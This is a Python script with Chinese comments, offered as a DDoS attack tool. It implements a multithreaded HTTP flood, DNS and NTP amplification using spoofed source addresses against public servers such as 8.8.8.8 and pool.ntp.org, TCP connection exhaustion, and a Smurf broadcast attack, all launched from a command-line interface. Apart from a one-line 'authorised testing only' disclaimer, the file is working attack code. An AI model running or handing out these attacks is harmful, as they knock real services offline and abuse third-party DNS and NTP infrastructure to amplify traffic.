#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS 分布式拒绝服务攻击脚本（5种攻击方式）
==========================================

包含：HTTP Flood、DNS放大、NTP放大、TCP连接耗尽、Smurf

用法：
  python ddos_attack.py --target <IP> --attack <http_flood|dns_amp|ntp_amp|tcp_exhaust|smurf|all>

⚠️ 仅用于授权测试环境，禁止用于未授权目标！

御链天鉴开发团队
"""

import argparse
import random
import socket
import time
import threading
import struct
import sys
from config import TARGET_IP, TARGET_PORT, ATTACK_DURATION
from scapy.all import IP, TCP, UDP, ICMP, Raw, DNS, DNSQR, NTP, send, sr1, RandShort, conf

conf.verb = 0

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
]

PATHS = ["/", "/index.html", "/api/data", "/search?q=test", "/login", "/about", "/contact",
         "/products", "/favicon.ico", "/assets/main.css", "/js/app.js", "/api/v1/users"]


# ========== 1. HTTP Flood ==========
def http_flood(target, port=80, duration=30, threads=50):
    """
    HTTP洪水攻击：多线程发送大量HTTP GET请求，耗尽Web服务器资源
    特征：海量HTTP请求，随机User-Agent和路径
    """
    print(f"[HTTP Flood] 目标={target}:{port}, 线程={threads}, 持续={duration}s")
    stats = {"count": 0}

    def worker():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, port))
                path = random.choice(PATHS)
                ua = random.choice(USER_AGENTS)
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(request.encode())
                stats["count"] += 1
                s.recv(1024)
                s.close()
            except Exception:
                pass
            time.sleep(random.uniform(0.01, 0.1))

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join(timeout=duration + 5)
    print(f"[HTTP Flood] 完成，共发送 {stats['count']:,} 个HTTP请求")


# ========== 2. DNS 放大攻击 ==========
def dns_amplification(target, dns_server="8.8.8.8", duration=30, pps=200):
    """
    DNS放大攻击：向开放DNS发送伪造源IP的查询请求，放大响应流量攻击目标
    特征：大量DNS查询包，源IP伪造为目标IP，查询ANY记录
    """
    print(f"[DNS放大] 目标={target}, DNS={dns_server}, 持续={duration}s")
    domains = ["google.com", "facebook.com", "microsoft.com", "apple.com",
               "amazon.com", "cloudflare.com", "github.com", "wikipedia.org"]
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        domain = random.choice(domains)
        pkt = (
            IP(src=target, dst=dns_server) /
            UDP(sport=RandShort(), dport=53) /
            DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))
        )
        send(pkt, count=min(pps, 50), inter=0)
        count += min(pps, 50)
        time.sleep(max(0, 1.0 / (pps / 50)))
    print(f"[DNS放大] 完成，共发送 {count:,} 个DNS查询包")


# ========== 3. NTP 放大攻击 ==========
def ntp_amplification(target, ntp_server="pool.ntp.org", duration=30, pps=200):
    """
    NTP放大攻击：利用NTP monlist命令的放大效应攻击目标
    特征：NTP请求包，monlist命令，源IP伪造
    """
    print(f"[NTP放大] 目标={target}, NTP={ntp_server}, 持续={duration}s")
    # NTP monlist 请求 (模式7, 实现特定)
    ntp_monlist = b'\x17\x00\x03\x2a' + b'\x00' * 4
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        pkt = (
            IP(src=target, dst=ntp_server) /
            UDP(sport=RandShort(), dport=123) /
            Raw(load=ntp_monlist)
        )
        send(pkt, count=min(pps, 50), inter=0)
        count += min(pps, 50)
        time.sleep(max(0, 1.0 / (pps / 50)))
    print(f"[NTP放大] 完成，共发送 {count:,} 个NTP请求包")


# ========== 4. TCP 连接耗尽 ==========
def tcp_connection_exhaust(target, port=80, duration=30, max_connections=1000):
    """
    TCP连接耗尽攻击：建立大量TCP连接但不发送数据，占满连接池
    特征：大量TCP三次握手完成但无数据传输
    """
    print(f"[TCP连接耗尽] 目标={target}:{port}, 最大连接={max_connections}, 持续={duration}s")
    sockets = []

    end_time = time.time() + duration
    while time.time() < end_time and len(sockets) < max_connections:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            sockets.append(s)
        except Exception:
            time.sleep(0.1)

    print(f"[TCP连接耗尽] 已建立 {len(sockets)} 个连接，保持至超时...")
    remaining = end_time - time.time()
    if remaining > 0:
        time.sleep(remaining)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    print(f"[TCP连接耗尽] 完成，共建立 {len(sockets)} 个空连接")


# ========== 5. Smurf 攻击 ==========
def smurf(target, broadcast="255.255.255.255", duration=30, pps=200):
    """
    Smurf攻击：向广播地址发送伪造源IP的ICMP Echo，使网络中所有主机回复目标
    特征：ICMP Echo Request发往广播地址，源IP为目标IP
    """
    print(f"[Smurf] 目标={target}, 广播={broadcast}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        pkt = IP(src=target, dst=broadcast) / ICMP(type=8, code=0) / Raw(load=b"A" * 64)
        send(pkt, count=min(pps, 50), inter=0)
        count += min(pps, 50)
        time.sleep(max(0, 1.0 / (pps / 50)))
    print(f"[Smurf] 完成，共发送 {count:,} 个广播ICMP包")


# ========== 主入口 ==========
ATTACK_MAP = {
    "http_flood": ("HTTP Flood洪水攻击", http_flood),
    "dns_amp": ("DNS放大攻击", dns_amplification),
    "ntp_amp": ("NTP放大攻击", ntp_amplification),
    "tcp_exhaust": ("TCP连接耗尽攻击", tcp_connection_exhaust),
    "smurf": ("Smurf广播攻击", smurf),
}

def main():
    parser = argparse.ArgumentParser(description="DDoS攻击工具 - 御链天鉴")
    parser.add_argument("--target", "-t", default=TARGET_IP, help=f"目标IP地址 (默认: {TARGET_IP})")
    parser.add_argument("--attack", "-a", default="http_flood",
                        choices=list(ATTACK_MAP.keys()) + ["all"], help="攻击类型")
    parser.add_argument("--port", "-p", type=int, default=80, help="目标端口")
    parser.add_argument("--duration", "-d", type=int, default=30, help="持续时间(秒)")
    parser.add_argument("--pps", type=int, default=200, help="每秒包数")
    args = parser.parse_args()

    print(f"{'='*60}")
    print(f"DDoS 分布式拒绝服务攻击工具 - 御链天鉴")
    print(f"目标: {args.target}:{args.port}")
    print(f"持续: {args.duration}s")
    print(f"{'='*60}")

    if args.attack == "all":
        for key, (name, func) in ATTACK_MAP.items():
            print(f"\n--- {name} ---")
            if key == "http_flood":
                func(args.target, port=args.port, duration=min(args.duration, 30))
            elif key == "tcp_exhaust":
                func(args.target, port=args.port, duration=min(args.duration, 30))
            elif key in ("dns_amp", "ntp_amp", "smurf"):
                func(args.target, duration=min(args.duration, 30), pps=args.pps)
            time.sleep(2)
    else:
        name, func = ATTACK_MAP[args.attack]
        print(f"\n--- {name} ---")
        if args.attack == "http_flood":
            func(args.target, port=args.port, duration=args.duration)
        elif args.attack == "tcp_exhaust":
            func(args.target, port=args.port, duration=args.duration)
        elif args.attack in ("dns_amp", "ntp_amp", "smurf"):
            func(args.target, duration=args.duration, pps=args.pps)

    print(f"\n{'='*60}")
    print("攻击完成")


if __name__ == "__main__":
    main()
